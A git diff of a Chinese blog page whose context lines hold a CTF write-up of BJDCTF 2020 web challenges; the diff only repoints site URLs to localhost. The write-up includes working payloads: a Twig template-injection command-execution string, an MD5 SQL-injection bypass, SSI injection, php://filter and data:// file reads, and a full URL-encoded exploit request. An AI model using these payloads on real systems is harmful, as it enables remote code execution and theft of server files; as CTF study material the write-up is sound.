@@ -11,22 +11,22 @@
   <meta name="author" content="kveln">
   <title>BJDCTF  Web题解 | 过客</title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
-  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
-  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <!-- <link href="http://localhost:4000/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="http://localhost:4000/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="BJDCTF  Web题解 | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="BJDCTF  Web题解 | 过客 » Feed" href="http://localhost:4000/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
-  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <link href="http://localhost:4000/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
   <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
-  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <!-- <script src="http://localhost:4000/media/scripts/jquery.min.js"></script> -->
   <script>hljs.initHighlightingOnLoad();</script>
   
 
     <meta property="og:description" content="BJDCTF  Web题解"/>
-    <meta property="og:url" content="https://guokeya.github.io/post/bjdctf-web-ti-jie/"/>
+    <meta property="og:url" content="http://localhost:4000/post/bjdctf-web-ti-jie/"/>
     <meta property="og:locale" content="zh-CN"/>
     <meta property="og:type" content="website"/>
     <meta property="og:site_name" content="过客"/>
@@ -35,7 +35,7 @@
   	<!-- Navigation -->
   <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
     <div class="container">
-      <a class="navbar-brand" href="https://guokeya.github.io">过客</a>
+      <a class="navbar-brand" href="http://localhost:4000">过客</a>
       <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
         Menu
         <i class="fas fa-bars"></i>
@@ -72,7 +72,7 @@
     </div>
   </nav>
   <!-- Page Header -->
-  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+  <header class="masthead" style="background-image: url('http://localhost:4000/media/images/home-bg.jpg')">
     <div class="overlay"></div>
     <div class="container">
       <div class="row">
@@ -80,9 +80,9 @@
           <div class="post-heading">
           	<span class="tags">
           	 
-            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            <a href="http://localhost:4000/tag/CTF/" class="tag">CTF</a>
             
-            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            <a href="http://localhost:4000/tag/Web/" class="tag">Web安全</a>
             
         </span>
             <h1>BJDCTF  Web题解</h1>
@@ -131,10 +131,10 @@ echo &quot;the flag is: &quot;.$flag;
 <p>简单的变量覆盖。<br>
 思路就是覆盖<code>$handsome</code>为<code>$flag</code>。通过exit输出<br>
 这里得通过<code>$_GET</code>进行覆盖。<code>$_POST</code>不存在变量覆盖<br>
-<img src="https://guokeya.github.io/post-images/1580703707162.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580703707162.png" alt="" loading="lazy"><br>
 <strong>[BJDCTF2020]Easy MD5</strong><br>
 在返回头中发现了hint<br>
-<img src="https://guokeya.github.io/post-images/1580703960537.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580703960537.png" alt="" loading="lazy"><br>
 md5函数的漏洞。第二个参数为True。即表示为16位原始二进制格式字符串</p>
 <pre><code>content: ffifdyop
 hex: 276f722736c95d99e921722cf9ed621c
@@ -162,15 +162,15 @@ if($_POST['param1']!==$_POST['param2']&amp;&amp;md5($_POST['param1'])===md5($_PO
 } 
 </code></pre>
 <p>不多说了。数组绕过<br>
-<img src="https://guokeya.github.io/post-images/1580704320213.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580704320213.png" alt="" loading="lazy"><br>
 <strong>[BJDCTF2020]The mystery of ip</strong><br>
 flag界面。有ip。尝试xff绕过<br>
-<img src="https://guokeya.github.io/post-images/1580704366654.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580704366654.png" alt="" loading="lazy"><br>
 模板注入。请求头中回显php。应该是twig或者smarty<br>
-<img src="https://guokeya.github.io/post-images/1580704440402.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580704440402.png" alt="" loading="lazy"><br>
 尝试smarty的payload。成功执行<br>
-<img src="https://guokeya.github.io/post-images/1580704511774.png" alt="" loading="lazy"><br>
-<img src="https://guokeya.github.io/post-images/1580704546357.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580704511774.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580704546357.png" alt="" loading="lazy"><br>
 <strong>[BJDCTF2020]ZJCTF，不过如此</strong></p>
 <pre><code>&lt;?php
 
@@ -216,8 +216,8 @@ function getFlag(){
 <p>preg_match代码执行<br>
 <code>\\1=\1代表匹配到的第一个字符,\s</code><br>
 <code>return preg_replace('/(\S* )/ei','strtolower(&quot;\\1&quot;)',$str)</code><br>
-<img src="https://guokeya.github.io/post-images/1580704708887.png" alt="" loading="lazy"><br>
-<img src="https://guokeya.github.io/post-images/1580704947869.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580704708887.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580704947869.png" alt="" loading="lazy"><br>
 <strong>[BJDCTF2020]EasySearch</strong><br>
 index.swp信息泄露</p>
 <pre><code>&lt;?php
@@ -261,16 +261,16 @@ index.swp信息泄露</p>
 然后将用户名写入public+随机数+.shtml<br>
 shtml有一个SSI注入可以执行命令<br>
 路径在回显中<br>
-<img src="https://guokeya.github.io/post-images/1580705267817.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580705267817.png" alt="" loading="lazy"><br>
 <strong>[BJDCTF2020]Cookie is so stable</strong><br>
 flag.php要求输入一个字符<br>
 输入后。放在cookie中的user字段。改了admin root都不能读取flag</p>
-<p><img src="https://guokeya.github.io/post-images/1580705357586.png" alt="" loading="lazy"><br>
+<p><img src="http://localhost:4000/post-images/1580705357586.png" alt="" loading="lazy"><br>
 <code>{}不能返回结果{{}}可以。返回头存在php，。twig模板注入</code></p>
-<figure data-type="image" tabindex="1"><img src="https://guokeya.github.io/post-images/1580705406126.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="http://localhost:4000/post-images/1580705406126.png" alt="" loading="lazy"></figure>
 <pre><code>{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;id&quot;)}}
 </code></pre>
-<p><img src="https://guokeya.github.io/post-images/1580705471713.png" alt="" loading="lazy"><br>
+<p><img src="http://localhost:4000/post-images/1580705471713.png" alt="" loading="lazy"><br>
 <strong>[BJDCTF2020]EzPHP</strong><br>
 主页得到hint<code>&lt;!-- GFXEIM3YFZYGQ4A= --&gt;</code><br>
 base32解码后得到1nD3x.php</p>
@@ -327,14 +327,14 @@ preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|sta
 } ?&gt; 
 </code></pre>
 <p>首先绕过第一个判断。</p>
-<figure data-type="image" tabindex="2"><img src="https://guokeya.github.io/post-images/1580718874763.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="http://localhost:4000/post-images/1580718874763.png" alt="" loading="lazy"></figure>
 <p>QUERY_STRING指的是1nD3x.php?后面的字符串。不能包括这些。那么URL编码即可</p>
-<p><img src="https://guokeya.github.io/post-images/1580719073052.png" alt="" loading="lazy"><br>
+<p><img src="http://localhost:4000/post-images/1580719073052.png" alt="" loading="lazy"><br>
 接下来。</p>
 <pre><code>$_GET['file']中不能包含http和https。
 $_GET['debu']要以aqua_is_cute开头结尾。但是又不能等于aqua_is_cute
 </code></pre>
-<p><img src="https://guokeya.github.io/post-images/1580719104529.png" alt="" loading="lazy"><br>
+<p><img src="http://localhost:4000/post-images/1580719104529.png" alt="" loading="lazy"><br>
 针对第二个。我们可以用%0a绕过。输入aqua_is_cute%0a<br>
 由于preg_match检测单行字符。%0a表示换行。</p>
 <pre><code>preg_match检测的是
@@ -344,18 +344,18 @@ aqua_is_cute        检测这一行。
 </code></pre>
 <p>再来看第一个判断。这个file要用来干什么<br>
 在后面第二个判断中出现了</p>
-<p><img src="https://guokeya.github.io/post-images/1580719356872.png" alt="" loading="lazy"><br>
+<p><img src="http://localhost:4000/post-images/1580719356872.png" alt="" loading="lazy"><br>
 file_get_contents($file)===debu_debu_aqua<br>
 不能使用http和https。而file_get_contents支持php伪协议。这里有php://input和data://两种选择<br>
 再回去看上一个判断</p>
-<p><img src="https://guokeya.github.io/post-images/1580719443029.png" alt="" loading="lazy"><br>
+<p><img src="http://localhost:4000/post-images/1580719443029.png" alt="" loading="lazy"><br>
 <code>$_REQUEST</code>的值不能有a-zA-Z。这里用的是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mrow></mrow><mi>R</mi></msub><mi>E</mi><mi>Q</mi><mi>U</mi><mi>E</mi><mi>S</mi><mi>T</mi><mi mathvariant="normal">而</mi><mi mathvariant="normal">不</mi><mi mathvariant="normal">是</mi></mrow><annotation encoding="application/x-tex">_REQUEST而不是</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault">Q</span><span class="mord mathdefault" style="margin-right:0.10903em;">U</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord cjk_fallback">而</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">是</span></span></span></span>_GET。所以我们POST和<code>$_GET</code>相同的变量名。值为1即可绕过。这里用了post。那么file_get_contents就不能<code>php://</code>input了<br>
 只能使用data<br>
 接着：sha1数组绕过。</p>
-<p><img src="https://guokeya.github.io/post-images/1580719570316.png" alt="" loading="lazy"><br>
+<p><img src="http://localhost:4000/post-images/1580719570316.png" alt="" loading="lazy"><br>
 extract($_GET[flag])<br>
 一个明显的变量覆盖。先放着。继续看</p>
-<p><img src="https://guokeya.github.io/post-images/1580719630184.png" alt="" loading="lazy"><br>
+<p><img src="http://localhost:4000/post-images/1580719630184.png" alt="" loading="lazy"><br>
 这里要求<code>$code</code>必须是a-z0-9开头和结尾<br>
 <code>$arg</code>做了过滤</p>
 <pre><code>$code('', $arg);
@@ -367,7 +367,7 @@ $arg=}phpinfo();
 接着又包含了f1ag.php<br>
 一般flag.php中flag都是以<code>$flag='flag{fdfd}'</code>存储的<br>
 我们打印下全局变量</p>
-<p><img src="https://guokeya.github.io/post-images/1580720075500.png" alt="" loading="lazy"><br>
+<p><img src="http://localhost:4000/post-images/1580720075500.png" alt="" loading="lazy"><br>
 flag在<code>rea1fl4g.php</code>中。<br>
 常用的scandir。readfile。file_get_contents都过滤了。<br>
 那么还有文件包含伪协议读取文件。这里没过滤require<br>
@@ -385,11 +385,11 @@ require(get_defined_vars()[_GET][rce]);
 =
 require('php://filter/read=convert.base64-encode/resource=rea1fl4g.php')
 </code></pre>
-<figure data-type="image" tabindex="3"><img src="https://guokeya.github.io/post-images/1580720593502.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="http://localhost:4000/post-images/1580720593502.png" alt="" loading="lazy"></figure>
 <pre><code>http://b5a169cf-daf9-4f18-90f0-b6316e8bb2c5.node3.buuoj.cn/1nD3x.php?%64%65%62%75=%61%71%75%61_is_c%75%74%65%0a&amp;file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d=%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f
 POST:%64%65%62%75=1&amp;file=1&amp;rce=1
 </code></pre>
-<p><img src="https://guokeya.github.io/post-images/1580720615932.png" alt="" loading="lazy"><br>
+<p><img src="http://localhost:4000/post-images/1580720615932.png" alt="" loading="lazy"><br>
 当然这里还能用取反来构造字符串。</p>
 <pre><code>require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%CE%99%93%9E%98%D1%8F%97%8F));//
 代替
@@ -401,7 +401,7 @@ php://filter/read=convert.base64-encode/resource=1flag.php
 
           
           <p class="next-post">下一篇：
-            <a href="https://guokeya.github.io/post/2020-xin-chun-hong-bao-ti-fan-xu-lie-hua-pop-lian/">
+            <a href="http://localhost:4000/post/2020-xin-chun-hong-bao-ti-fan-xu-lie-hua-pop-lian/">
               <span class="post-title">
                 [2020 新春红包题]反序列化pop链&rarr;
               </span>
@@ -436,7 +436,7 @@ php://filter/read=convert.base64-encode/resource=1flag.php
             
               
               <li class="list-inline-item">
-              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+              <a href="http://localhost:4000/atom.xml" target="_blank">
                 <span class="fa-stack fa-lg">
                   <i class="fas fa-circle fa-stack-2x"></i>
                   <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
@@ -451,10 +451,10 @@ php://filter/read=convert.base64-encode/resource=1flag.php
    </footer>
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
-  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- <script src="http://localhost:4000/media/scripts/bootstrap.bundle.min.js"></script> -->
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
-  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <!-- <script src="http://localhost:4000/media/scripts/clean-blog.min.js"></script> -->
   <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
   <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
 <a id="back_to_top" href="#" class="back_to_top">
